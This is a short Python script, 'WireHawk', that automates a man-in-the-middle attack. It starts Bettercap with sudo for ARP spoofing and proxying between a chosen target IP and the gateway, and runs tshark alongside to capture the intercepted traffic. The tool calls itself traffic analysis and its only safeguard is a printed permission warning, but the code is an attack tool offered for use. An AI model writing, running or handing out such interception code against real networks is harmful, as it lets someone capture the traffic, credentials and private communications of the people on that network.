import subprocess
import argparse
import time
from colorama import Fore, Style, init

# Init colorama
init(autoreset=True)

def print_intro():
    # Intro
    print(Fore.CYAN + Style.BRIGHT + "WireHawk Alpha Relase")
    print(Fore.GREEN + "-----------------------------------------------")
    print(Fore.YELLOW + "This tool automates Bettercap and Wireshark")
    print(Fore.MAGENTA + "for real-time network traffic analysis.")
    print(Fore.GREEN + "-----------------------------------------------")
    print(Fore.RED + "Warning: Ensure you have permission to analyze the network.")

def start_bettercap(interface, target_ip, gateway_ip):
    # Start Bettercap with ARP spoofing attack
    print(Fore.BLUE + f"Starting Bettercap on {interface} with target {target_ip} and gateway {gateway_ip}...")
    bettercap_cmd = [
        "sudo", "bettercap", "-I", interface, "-T", target_ip, "--gateway", gateway_ip, "--proxy"
    ]
    return subprocess.Popen(bettercap_cmd)

def start_tshark(interface):
    # Start tshark to monitor network traffic
    print(Fore.BLUE + f"Starting tshark on {interface}...")
    tshark_cmd = ["sudo", "tshark", "-i", interface]
    return subprocess.Popen(tshark_cmd)

def stop_process(process):
    # Stop a process (Bettercap or tshark)
    process.terminate()
    process.wait()

def main():
    # Display the introduction
    print_intro()

    # Configure the interface and example IPs
    parser = argparse.ArgumentParser(description="Automate Bettercap and Wireshark")
    parser.add_argument("-i", "--interface", required=True, help="Network interface (e.g., eth0, wlan0)")
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP address")
    
    args = parser.parse_args()

    # Start Bettercap and tshark
    bettercap_process = start_bettercap(args.interface, args.target, args.gateway)
    tshark_process = start_tshark(args.interface)

    try:
        print(Fore.GREEN + "Monitoring in progress. Press Ctrl+C to stop.")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(Fore.RED + "\nStopping the analysis.")
        stop_process(bettercap_process)
        stop_process(tshark_process)

if __name__ == "__main__":
    main()
